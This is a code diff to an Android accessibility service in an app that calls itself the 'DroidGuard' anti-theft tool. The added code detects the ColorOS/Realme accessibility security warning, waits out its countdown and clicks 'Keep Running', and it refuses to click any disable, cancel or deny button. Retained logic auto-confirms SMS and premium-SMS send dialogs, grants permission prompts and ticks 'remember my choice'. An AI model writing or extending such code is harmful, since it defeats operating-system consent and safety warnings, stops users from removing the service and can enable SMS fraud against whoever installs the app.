@@ -1,11 +1,11 @@
 package com.antitheft.droidguard;
 
 import android.accessibilityservice.AccessibilityService;
-import android.app.admin.DevicePolicyManager;
-import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.os.Handler;
+import android.os.Looper;
 import android.os.SystemClock;
 import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
@@ -16,11 +16,14 @@ import java.util.Locale;
 /**
  * DroidGuard Smart Security Auto-Confirm Service
  * 
- * Operates in 100% SLEEP/STANDBY mode during normal phone usage.
- * Only wakes up for a short window (e.g. 45-60s) when DroidGuard triggers
- * an emergency SMS dispatch or enters theft mode.
- * 
- * Strictly ignores keyboards (Baidu, Gboard, SwiftKey, etc.) and user applications.
+ * Intelligent Accessibility Service that:
+ * 1. Automatically recognizes system SMS and security dialogs.
+ * 2. SPECIFICALLY handles the ColorOS/Realme Accessibility Warning Dialog:
+ *    - Strictly blocks "إيقاف تشغيل إمكانية الوصول" (Disable Accessibility)!
+ *    - Reads the screen, detects the countdown timer, and waits for "استمرار التشغيل" (Keep Running).
+ *    - Automatically clicks "استمرار التشغيل" the moment the 4-second countdown finishes!
+ * 3. Never clicks dangerous cancel/disable/deny buttons.
+ * 4. Checks "Remember my choice" / "عدم السؤال مرة أخرى" for permanent authorization.
  */
 public class AutoConfirmService extends AccessibilityService {
     private static final String TAG = "AutoConfirmService";
@@ -33,9 +36,12 @@ public class AutoConfirmService extends AccessibilityService {
 
     private static volatile long emergencyArmedUntilMemory = 0L;
     private static long lastActionTimestamp = 0L;
-    private static final long ACTION_DEBOUNCE_MS = 600L;
+    private static final long ACTION_DEBOUNCE_MS = 350L;
 
-    // Strict Permission & Security Dialog Packages ONLY (where SMS carrier prompts and permission dialogs appear)
+    private final Handler mainHandler = new Handler(Looper.getMainLooper());
+    private boolean isWatcherRunning = false;
+
+    // Strict Permission & Security Dialog Packages (ColorOS, Realme UI, Xiaomi MIUI/HyperOS, Samsung OneUI, AOSP)
     private static final String[] PERMISSION_DIALOG_PACKAGES = new String[] {
         "com.google.android.permissioncontroller",
         "com.android.permissioncontroller",
@@ -52,10 +58,13 @@ public class AutoConfirmService extends AccessibilityService {
         "com.transsion.phonemanager",
         "com.huawei.systemmanager",
         "com.android.systemui",
+        "com.android.settings",
+        "com.coloros.settings",
+        "com.oplus.wirelesssettings",
         "android"
     };
 
-    // Explicit SMS and Security Confirmation Warning Phrases (Arabic, French, English)
+    // SMS and Security Confirmation Warning Phrases
     private static final String[] SMS_WARNING_KEYWORDS = new String[] {
         "سيرسل رسالة sms",
         "سيرسل رسالة",
@@ -86,12 +95,48 @@ public class AutoConfirmService extends AccessibilityService {
         "send premium sms",
         "is attempting to send an sms",
         "أمانك المالي",
+        "امانك المالي",
         "خطرا على خصوصيتك",
+        "خطرًا على خصوصيتك",
         "إذن إمكانية الوصول",
         "إمكانية الوصول",
+        "امكانية الوصول",
+        "استمرار التشغيل",
         "financial security",
         "risk to your privacy",
         "accessibility permission"
+    };
+
+    // STRICT DANGEROUS/NEGATIVE WORDS: NEVER EVER CLICK A BUTTON CONTAINING THESE!
+    private static final String[] DANGEROUS_NEGATIVE_WORDS = new String[] {
+        "إيقاف تشغيل إمكانية الوصول",
+        "ايقاف تشغيل امكانية الوصول",
+        "إيقاف تشغيل",
+        "ايقاف تشغيل",
+        "إيقاف",
+        "ايقاف",
+        "تعطيل",
+        "إلغاء",
+        "الغاء",
+        "رفض",
+        "عدم السماح",
+        "لا تسمح",
+        "حظر",
+        "disable",
+        "turn off",
+        "turn-off",
+        "shut down",
+        "stop",
+        "cancel",
+        "deny",
+        "don't allow",
+        "dont allow",
+        "block",
+        "refuser",
+        "annuler",
+        "désactiver",
+        "desactiver",
+        "bloquer"
     };
 
     // Specific button View IDs used in system SMS confirmation dialogs
@@ -105,19 +150,15 @@ public class AutoConfirmService extends AccessibilityService {
         "com.samsung.android.permissioncontroller:id/permission_allow_always_button",
         "com.miui.securitycenter:id/accept",
         "com.miui.securitycenter:id/btn_allow",
-        "com.oplus.safecenter:id/btn_confirm",
-        "com.oplus.safecenter:id/btn_allow",
-        "com.coloros.safecenter:id/btn_confirm",
-        "com.coloros.safecenter:id/btn_allow",
+        "com.oplus.safecenter:id/btn_continue",
         "com.coloros.safecenter:id/btn_continue",
         "com.oplus.securitypermission:id/permission_allow_button",
         "com.coloros.securitypermission:id/permission_allow_button",
         "com.oplus.securitypermission:id/btn_allow",
-        "com.coloros.securitypermission:id/btn_allow",
-        "android:id/button1"
+        "com.coloros.securitypermission:id/btn_allow"
     };
 
-    // Explicit Full Positive Button Phrases (Will NOT match random buttons in keyboards or search bars)
+    // Explicit Positive Button Phrases (Arabic, French, English)
     private static final String[] POSITIVE_BUTTON_TEXTS = new String[] {
         "إرسال",
         "ارسال",
@@ -145,6 +186,8 @@ public class AutoConfirmService extends AccessibilityService {
         "always allow",
         "allow all the time",
         "continue",
+        "keep on",
+        "keep using",
         "yes",
         "ok"
     };
@@ -160,35 +203,15 @@ public class AutoConfirmService extends AccessibilityService {
         "com.coloros.safecenter:id/checkbox"
     };
 
-    /**
-     * Arms the AutoConfirmService for an active emergency window (e.g. 45 to 60 seconds).
-     * Call this whenever an emergency SMS is triggered or theft event occurs.
-     */
-    public static void armEmergencyWindow(Context context, long durationMs) {
-        long until = System.currentTimeMillis() + (durationMs > 0 ? durationMs : 45_000L);
+    public static void armEmergencyAutoConfirm(Context context, long durationMs) {
+        long until = System.currentTimeMillis() + durationMs;
         emergencyArmedUntilMemory = until;
         try {
-            if (context != null) {
-                SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
-                prefs.edit().putLong(KEY_EMERGENCY_ARMED_UNTIL, until).apply();
-            }
+            SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+            prefs.edit().putLong(KEY_EMERGENCY_ARMED_UNTIL, until).apply();
         } catch (Exception ignored) {}
-
-        try {
-            if (context != null) {
-                Intent intent = new Intent(context, AutoConfirmService.class);
-                intent.setAction(ACTION_ARM_EMERGENCY);
-                intent.putExtra("duration", durationMs > 0 ? durationMs : 45_000L);
-                context.startService(intent);
-            }
-        } catch (Exception ignored) {}
-
-        Log.i(TAG, "🚨 AutoConfirmService ARMED for emergency dispatch window until: " + until);
     }
 
-    /**
-     * Checks if the service is currently armed for emergency auto-confirmation.
-     */
     public static boolean isEmergencyWindowActive(Context context) {
         long now = System.currentTimeMillis();
         if (now < emergencyArmedUntilMemory) {
@@ -238,6 +261,7 @@ public class AutoConfirmService extends AccessibilityService {
     @Override
     public void onDestroy() {
         if (instance == this) instance = null;
+        isWatcherRunning = false;
         super.onDestroy();
     }
 
@@ -258,10 +282,6 @@ public class AutoConfirmService extends AccessibilityService {
         return false;
     }
 
-    public static boolean openNativePowerMenu() {
-        return openNativePowerMenu(null);
-    }
-
     private static void safeRecycle(AccessibilityNodeInfo node) {
         if (node != null) {
             try {
@@ -279,6 +299,241 @@ public class AutoConfirmService extends AccessibilityService {
         }
     }
 
+    /**
+     * Checks whether a node or its text represents a dangerous negative action (e.g. Disable / Turn off / Cancel).
+     */
+    private boolean isDangerousNode(AccessibilityNodeInfo node) {
+        if (node == null) return false;
+        try {
+            CharSequence text = node.getText();
+            if (text != null && containsDangerousWord(text.toString())) {
+                return true;
+            }
+            CharSequence desc = node.getContentDescription();
+            if (desc != null && containsDangerousWord(desc.toString())) {
+                return true;
+            }
+            // Check immediate child nodes
+            int count = node.getChildCount();
+            for (int i = 0; i < count; i++) {
+                AccessibilityNodeInfo child = node.getChild(i);
+                if (child != null) {
+                    try {
+                        CharSequence cText = child.getText();
+                        if (cText != null && containsDangerousWord(cText.toString())) {
+                            return true;
+                        }
+                    } finally {
+                        safeRecycle(child);
+                    }
+                }
+            }
+        } catch (Throwable ignored) {}
+        return false;
+    }
+
+    private boolean containsDangerousWord(String raw) {
+        if (raw == null || raw.trim().isEmpty()) return false;
+        String lower = raw.toLowerCase(Locale.ROOT).trim();
+        for (String danger : DANGEROUS_NEGATIVE_WORDS) {
+            if (lower.contains(danger)) {
+                return true;
+            }
+        }
+        return false;
+    }
+
+    /**
+     * Extract all visible text from the window hierarchy to understand what is displayed.
+     */
+    private String extractAllText(AccessibilityNodeInfo node) {
+        if (node == null) return "";
+        StringBuilder sb = new StringBuilder();
+        collectTextRecursive(node, sb, 0);
+        return sb.toString();
+    }
+
+    private void collectTextRecursive(AccessibilityNodeInfo node, StringBuilder sb, int depth) {
+        if (node == null || depth > 25) return;
+        try {
+            CharSequence text = node.getText();
+            if (text != null && text.length() > 0) {
+                sb.append(" ").append(text);
+            }
+            CharSequence desc = node.getContentDescription();
+            if (desc != null && desc.length() > 0) {
+                sb.append(" ").append(desc);
+            }
+            int count = node.getChildCount();
+            for (int i = 0; i < count; i++) {
+                AccessibilityNodeInfo child = node.getChild(i);
+                if (child != null) {
+                    try {
+                        collectTextRecursive(child, sb, depth + 1);
+                    } finally {
+                        safeRecycle(child);
+                    }
+                }
+            }
+        } catch (Throwable ignored) {}
+    }
+
+    /**
+     * Detects if the current screen is the ColorOS / Realme / Android Accessibility Security Warning dialog.
+     */
+    private boolean isAccessibilitySecurityDialog(AccessibilityNodeInfo rootNode) {
+        if (rootNode == null) return false;
+        String full = extractAllText(rootNode).toLowerCase(Locale.ROOT);
+        boolean mentionsAccessibility = full.contains("إمكانية الوصول") 
+            || full.contains("امكانية الوصول")
+            || full.contains("accessibility");
+            
+        boolean mentionsWarningOrContinue = full.contains("استمرار التشغيل")
+            || full.contains("استمرار")
+            || full.contains("أمانك المالي")
+            || full.contains("امانك المالي")
+            || full.contains("خصوصيتك")
+            || full.contains("خطر")
+            || full.contains("تم منح")
+            || full.contains("financial security")
+            || full.contains("privacy");
+
+        return mentionsAccessibility && mentionsWarningOrContinue;
+    }
+
+    /**
+     * Finds the "استمرار التشغيل" / "Continue" button in the hierarchy.
+     */
+    private AccessibilityNodeInfo findContinueButtonRecursive(AccessibilityNodeInfo node) {
+        if (node == null) return null;
+        try {
+            if (!isDangerousNode(node)) {
+                CharSequence text = node.getText();
+                if (text != null) {
+                    String s = text.toString().toLowerCase(Locale.ROOT).trim();
+                    if (s.contains("استمرار") || s.contains("continuer") || s.contains("continue") || s.contains("keep")) {
+                        return AccessibilityNodeInfo.obtain(node);
+                    }
+                }
+                CharSequence desc = node.getContentDescription();
+                if (desc != null) {
+                    String s = desc.toString().toLowerCase(Locale.ROOT).trim();
+                    if (s.contains("استمرار") || s.contains("continuer") || s.contains("continue") || s.contains("keep")) {
+                        return AccessibilityNodeInfo.obtain(node);
+                    }
+                }
+            }
+
+            int count = node.getChildCount();
+            for (int i = 0; i < count; i++) {
+                AccessibilityNodeInfo child = node.getChild(i);
+                if (child != null) {
+                    try {
+                        AccessibilityNodeInfo found = findContinueButtonRecursive(child);
+                        if (found != null) {
+                            return found;
+                        }
+                    } finally {
+                        safeRecycle(child);
+                    }
+                }
+            }
+        } catch (Throwable ignored) {}
+        return null;
+    }
+
+    /**
+     * Start background watcher loop to monitor countdown and click "استمرار التشغيل" as soon as it becomes enabled.
+     */
+    private void startContinueWatcher() {
+        if (isWatcherRunning) return;
+        isWatcherRunning = true;
+
+        final long startTime = SystemClock.uptimeMillis();
+        final long MAX_WATCH_TIME_MS = 8000L; // Poll for up to 8 seconds
+
+        mainHandler.post(new Runnable() {
+            @Override
+            public void run() {
+                if (!isWatcherRunning) return;
+
+                if (SystemClock.uptimeMillis() - startTime > MAX_WATCH_TIME_MS) {
+                    Log.i(TAG, "Continue watcher finished timeout.");
+                    isWatcherRunning = false;
+                    return;
+                }
+
+                AccessibilityNodeInfo root = null;
+                try {
+                    root = getRootInActiveWindow();
+                    if (root != null) {
+                        AccessibilityNodeInfo target = findContinueButtonRecursive(root);
+                        if (target != null) {
+                            try {
+                                CharSequence t = target.getText();
+                                boolean enabled = target.isEnabled();
+                                Log.d(TAG, "Watcher checking continue button: [" + t + "], isEnabled=" + enabled);
+
+                                if (enabled) {
+                                    boolean clicked = clickNodeOrParent(target);
+                                    if (clicked) {
+                                        Log.i(TAG, "🎉 Watcher: Successfully clicked 'استمرار التشغيل' (Keep Running)!");
+                                        isWatcherRunning = false;
+                                        return;
+                                    }
+                                }
+                            } finally {
+                                safeRecycle(target);
+                            }
+                        }
+                    }
+                } catch (Throwable e) {
+                    Log.w(TAG, "Watcher cycle error: " + e.getMessage());
+                } finally {
+                    safeRecycle(root);
+                }
+
+                if (isWatcherRunning) {
+                    mainHandler.postDelayed(this, 300);
+                }
+            }
+        });
+    }
+
+    /**
+     * Specialized handler for the ColorOS Accessibility Security Warning dialog.
+     * STRICTLY PREVENTS clicking "إيقاف تشغيل إمكانية الوصول"!
+     */
+    private boolean handleAccessibilitySecurityDialog(AccessibilityNodeInfo rootNode) {
+        Log.i(TAG, "🛡️ Handling Accessibility Security Dialog. Protecting service from shutdown!");
+
+        AccessibilityNodeInfo continueBtn = findContinueButtonRecursive(rootNode);
+        if (continueBtn != null) {
+            try {
+                CharSequence text = continueBtn.getText();
+                String textStr = text != null ? text.toString() : "";
+                Log.i(TAG, "Target continue button text: [" + textStr + "], isEnabled: " + continueBtn.isEnabled());
+
+                if (continueBtn.isEnabled()) {
+                    boolean clicked = clickNodeOrParent(continueBtn);
+                    if (clicked) {
+                        Log.i(TAG, "🎉 Successfully clicked 'استمرار التشغيل'!");
+                        isWatcherRunning = false;
+                        return true;
+                    }
+                } else {
+                    Log.i(TAG, "⏳ Countdown timer in progress (" + textStr + "). Starting smart watcher...");
+                }
+            } finally {
+                safeRecycle(continueBtn);
+            }
+        }
+
+        // Start active polling until the countdown finishes and button becomes enabled
+        startContinueWatcher();
+        return true;
+    }
+
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
         if (event == null) return;
@@ -289,7 +544,7 @@ public class AutoConfirmService extends AccessibilityService {
             if (pkgName == null) return;
             String pkgStr = pkgName.toString().toLowerCase(Locale.ROOT);
 
-            // Skip all keyboard, IME, and search engine input methods immediately
+            // Skip all keyboard, IME, and search engines immediately
             if (pkgStr.contains("inputmethod") || pkgStr.contains("keyboard") || 
                 pkgStr.contains("ime") || pkgStr.contains("baidu") || pkgStr.contains("touchtype")) {
                 return;
@@ -320,6 +575,13 @@ public class AutoConfirmService extends AccessibilityService {
             }
             if (rootNode == null) return;
 
+            // INTELLIGENT ROUTE 1: ColorOS / Realme Accessibility Security Warning Dialog
+            if (isAccessibilitySecurityDialog(rootNode)) {
+                lastActionTimestamp = now;
+                handleAccessibilitySecurityDialog(rootNode);
+                return;
+            }
+
             // Check if dialog contains SMS or permission warning keywords
             boolean isSmsWarningDialog = false;
             for (String kw : SMS_WARNING_KEYWORDS) {
@@ -337,7 +599,7 @@ public class AutoConfirmService extends AccessibilityService {
                 }
             }
 
-            // On security packages, even if specific text differs, check for known positive buttons
+            // If not an SMS dialog and not a security package, ignore
             if (!isSmsWarningDialog && !isSecurityPackage) {
                 return;
             }
@@ -347,34 +609,15 @@ public class AutoConfirmService extends AccessibilityService {
             // Step 1: Auto-check "Remember my choice" / "عدم السؤال مرة أخرى"
             autoCheckRememberChoice(rootNode);
 
-            // Step 2: Attempt clicking positive button by known OEM View IDs
-            for (String viewId : POSITIVE_VIEW_IDS) {
-                List<AccessibilityNodeInfo> positiveButtons = null;
-                try {
-                    positiveButtons = rootNode.findAccessibilityNodeInfosByViewId(viewId);
-                    if (positiveButtons != null && !positiveButtons.isEmpty()) {
-                        for (AccessibilityNodeInfo btn : positiveButtons) {
-                            if (btn.isEnabled() && clickNodeOrParent(btn)) {
-                                Log.i(TAG, "✅ Auto-confirmed SMS send via OEM View ID [" + viewId + "] successfully!");
-                                safeRecycleList(positiveButtons);
-                                return;
-                            }
-                        }
-                    }
-                } catch (Throwable ignored) {
-                } finally {
-                    safeRecycleList(positiveButtons);
-                }
-            }
-
-            // Step 3: Attempt clicking positive button by matching exact positive phrases
+            // Step 2: Attempt clicking exact positive button phrases (SMS Send / Allow)
             for (String positiveText : POSITIVE_BUTTON_TEXTS) {
                 List<AccessibilityNodeInfo> matchingButtons = null;
                 try {
                     matchingButtons = rootNode.findAccessibilityNodeInfosByText(positiveText);
                     if (matchingButtons != null && !matchingButtons.isEmpty()) {
                         for (AccessibilityNodeInfo btn : matchingButtons) {
-                            if (btn.isEnabled() && clickNodeOrParent(btn)) {
+                            // CRITICAL: NEVER click if node is dangerous!
+                            if (!isDangerousNode(btn) && btn.isEnabled() && clickNodeOrParent(btn)) {
                                 Log.i(TAG, "✅ Auto-confirmed SMS send via text [" + positiveText + "] successfully!");
                                 safeRecycleList(matchingButtons);
                                 return;
@@ -387,22 +630,25 @@ public class AutoConfirmService extends AccessibilityService {
                 }
             }
 
-            // Step 4: Fallback to standard Dialog OK/Button1
-            List<AccessibilityNodeInfo> standardButtons = null;
-            try {
-                standardButtons = rootNode.findAccessibilityNodeInfosByViewId("android:id/button1");
-                if (standardButtons != null && !standardButtons.isEmpty()) {
-                    for (AccessibilityNodeInfo btn : standardButtons) {
-                        if (btn.isEnabled() && clickNodeOrParent(btn)) {
-                            Log.i(TAG, "✅ Auto-confirmed SMS send via dialog button1 successfully!");
-                            safeRecycleList(standardButtons);
-                            return;
+            // Step 3: Attempt clicking positive button by known OEM View IDs
+            for (String viewId : POSITIVE_VIEW_IDS) {
+                List<AccessibilityNodeInfo> positiveButtons = null;
+                try {
+                    positiveButtons = rootNode.findAccessibilityNodeInfosByViewId(viewId);
+                    if (positiveButtons != null && !positiveButtons.isEmpty()) {
+                        for (AccessibilityNodeInfo btn : positiveButtons) {
+                            // CRITICAL: NEVER click if node is dangerous!
+                            if (!isDangerousNode(btn) && btn.isEnabled() && clickNodeOrParent(btn)) {
+                                Log.i(TAG, "✅ Auto-confirmed SMS send via OEM View ID [" + viewId + "] successfully!");
+                                safeRecycleList(positiveButtons);
+                                return;
+                            }
                         }
                     }
+                } catch (Throwable ignored) {
+                } finally {
+                    safeRecycleList(positiveButtons);
                 }
-            } catch (Throwable ignored) {
-            } finally {
-                safeRecycleList(standardButtons);
             }
 
         } catch (Throwable e) {
